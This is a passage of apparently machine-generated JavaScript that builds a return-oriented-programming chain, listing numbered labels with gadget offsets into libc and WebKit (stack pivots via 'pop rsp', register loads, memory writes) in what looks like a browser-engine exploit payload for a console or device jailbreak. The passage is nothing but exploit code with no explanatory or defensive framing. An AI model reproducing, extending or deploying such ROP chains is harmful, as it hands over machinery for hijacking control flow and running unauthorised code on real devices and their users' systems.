//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1113592, //L1687
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L1687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1113680, //L1689
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1113712, //L1691
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1689:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1690:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L1691:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1113824, //L1694
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1113808, //L1693
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1113920, //L1696
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1695:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1696:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1114008, //L1698
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1114024, //L1699
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1698:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1699:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1114168, //L1703
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1114184, //L1704
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1114136, //L1701
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1701:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L1702:
db([12, 0]); // 0xc
set_gadget(libc_base+763368,); //pop rcx
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1114272, //L1705
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1114288, //L1706
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1705:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1114448, //L1709
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1114480, //L1711
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1114432, //L1708
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1114464, //L1710
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1709:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1114592, //L1714
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1114560, //L1712
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1712:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L1713:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+759608,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1114696, //L1716
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1715:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1716:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1114784, //L1718
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1114800, //L1719
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1718:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1114904, //L1722
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1114888, //L1721
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L1721:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1722:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1114976, //L1725
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
//L1724:
db([12, 0]); // 0xc
set_gadget(libc_base+763368,); //pop rcx
//L1725:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1115144, //L1728
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1115160, //L1729
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1115128, //L1727
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1727:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1115288, //L1731
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1115304, //L1732
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1115272, //L1730
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+2115150, //setle al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1115480, //L1734
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1115496, //L1735
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1115464, //L1733
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1733:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1115624, //L1738
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1115672, //L1741
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1115640, //L1739
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L1737:
db([0, 0]); // 0x0
set_gadget(webkit_base+3236123,); //pop r9
//L1738:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1739:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1740:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+346125, //setne al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1115792, //L1742+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1115784, //L1742
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1115808, //L1742+24
ropchain+1120072, //L1736
libc_base+764760, //pop rsi
ropchain+1115864, //L1744
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1743:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1744:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1115952, //L1746
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1115968, //L1747
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1746:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1747:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1116112, //L1751
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1116128, //L1752
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1116080, //L1749
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1749:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L1750:
db([36, 0]); // 0x24
set_gadget(libc_base+763368,); //pop rcx
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1116216, //L1753
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1116232, //L1754
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1753:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1116392, //L1757
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1116424, //L1759
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1116376, //L1756
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1116408, //L1758
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1757:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1116504, //L1760
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1116520, //L1761
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1116616, //L1763
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1116600, //L1762
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1116712, //L1765
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1764:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1765:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1116800, //L1767
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1116816, //L1768
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1767:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1768:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1116960, //L1772
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1116976, //L1773
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1116928, //L1770
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1770:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L1771:
db([12, 0]); // 0xc
set_gadget(libc_base+763368,); //pop rcx
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1117064, //L1774
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1117080, //L1775
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1774:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1117240, //L1778
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1117272, //L1780
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1117224, //L1777
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1117256, //L1779
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1778:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1117352, //L1781
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1117368, //L1782
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1117496, //L1784
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1117512, //L1785
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1117480, //L1783
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+2115150, //setle al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1117688, //L1787
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1117704, //L1788
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1117672, //L1786
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1786:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1117832, //L1791
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1117880, //L1794
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1117848, //L1792
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L1790:
db([0, 0]); // 0x0
set_gadget(webkit_base+3236123,); //pop r9
//L1791:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1792:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1117992, //L1795+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1117984, //L1795
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1118008, //L1795+24
ropchain+1119696, //L1789
libc_base+764760, //pop rsi
ropchain+1118064, //L1797
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1796:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1797:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1118152, //L1799
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1118168, //L1800
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1799:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1118328, //L1803
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1118360, //L1805
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1118312, //L1802
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1118344, //L1804
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1803:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1118440, //L1806
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1118456, //L1807
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1118616, //L1811
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1118568, //L1808
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1118584, //L1809
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1808:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1809:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1810:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1118672, //L1812
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L1812:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1118784, //L1814
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1118816, //L1816
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1118800, //L1815
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1814:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1118896, //L1817
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1118912, //L1818
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1119008, //L1820
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1118992, //L1819
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1119088, //L1821
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1821:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1822:
db([10, 0]); // 0xa
set_gadget(libc_base+759608,); //pop rax
//L1823:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1119248, //L1825
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1119264, //L1826
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1119232, //L1824
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
libc_base+346125, //setne al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1119440, //L1828
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1119456, //L1829
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1119424, //L1827
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1827:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
